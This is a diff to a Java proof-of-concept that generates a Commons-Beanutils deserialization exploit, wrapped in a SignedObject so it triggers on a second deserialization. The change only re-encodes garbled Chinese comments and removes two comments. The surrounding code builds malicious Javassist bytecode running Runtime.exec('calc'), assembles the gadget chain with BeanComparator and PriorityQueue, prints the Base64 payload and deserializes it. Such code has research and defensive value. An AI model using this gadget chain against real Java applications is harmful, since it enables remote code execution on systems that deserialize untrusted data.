@@ -25,7 +25,7 @@ public class CB_withoutCC_twice_deserialization {
     }
 
     public static PriorityQueue<Object>  getpayload(Object object, String string) throws NoSuchFieldException, IllegalAccessException {
-        //ÎÒÃÇÖ»ĞèÒª·´Éä½«¶ÔÓ¦µÄcomparatorĞ´ÈëÊôĞÔÖĞ£¬¾Í²»ĞèÒªÒÀÀµCC¿âÁË
+        //æˆ‘ä»¬åªéœ€è¦åå°„å°†å¯¹åº”çš„comparatorå†™å…¥å±æ€§ä¸­ï¼Œå°±ä¸éœ€è¦ä¾èµ–CCåº“äº†
         BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
         PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
         priorityQueue.add("1");
@@ -36,7 +36,7 @@ public class CB_withoutCC_twice_deserialization {
     }
 
     public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchAlgorithmException, SignatureException, InvalidKeyException {
-        //Éú³É¶ñÒâµÄ×Ö½ÚÂë
+        //ç”Ÿæˆæ¶æ„çš„å­—èŠ‚ç 
         String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
         ClassPool classPool = ClassPool.getDefault();
         CtClass ctClass = classPool.makeClass("evilexp");
@@ -51,8 +51,8 @@ public class CB_withoutCC_twice_deserialization {
 
         PriorityQueue queue1 = getpayload(obj, "outputProperties");
 
-        //DSAËã·¨Ê¹ÓÃË½Ô¿¶Ôjava¶ÔÏóqueue1½øĞĞÊı×ÖÇ©Ãû£¬Éú³ÉÒ»¸öSignedObject¶ÔÏó
-        //×¢£ºÊı×ÖÇ©Ãû¿ÉÒÔÓÃÓÚÑéÖ¤Êı¾İµÄÍêÕûĞÔºÍÉí·İÑéÖ¤¡£ÔÚÕâ¸öÀı×ÓÖĞ£¬Êı×ÖÇ©Ãû¿ÉÒÔÓÃÓÚÑéÖ¤ queue1 ¶ÔÏóµÄÀ´Ô´ºÍÍêÕûĞÔ£¬ÒÔÈ·±£ËüÃ»ÓĞ±»´Û¸Ä»òÎ±Ôì¡£
+        //DSAç®—æ³•ä½¿ç”¨ç§é’¥å¯¹javaå¯¹è±¡queue1è¿›è¡Œæ•°å­—ç­¾åï¼Œç”Ÿæˆä¸€ä¸ªSignedObjectå¯¹è±¡
+        //æ³¨ï¼šæ•°å­—ç­¾åå¯ä»¥ç”¨äºéªŒè¯æ•°æ®çš„å®Œæ•´æ€§å’Œèº«ä»½éªŒè¯ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ•°å­—ç­¾åå¯ä»¥ç”¨äºéªŒè¯ queue1 å¯¹è±¡çš„æ¥æºå’Œå®Œæ•´æ€§ï¼Œä»¥ç¡®ä¿å®ƒæ²¡æœ‰è¢«ç¯¡æ”¹æˆ–ä¼ªé€ ã€‚
         KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
         kpg.initialize(1024);
         KeyPair kp = kpg.generateKeyPair();
@@ -60,14 +60,12 @@ public class CB_withoutCC_twice_deserialization {
 
         PriorityQueue queue2 = getpayload(signedObject, "object");
 
-        //ĞòÁĞ»¯
         ByteArrayOutputStream baor = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(baor);
         oos.writeObject(queue2);
         oos.close();
         System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));
 
-        //·´ĞòÁĞ»¯
         ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
         ObjectInputStream ois = new ObjectInputStream(bais);
         Object o = ois.readObject();
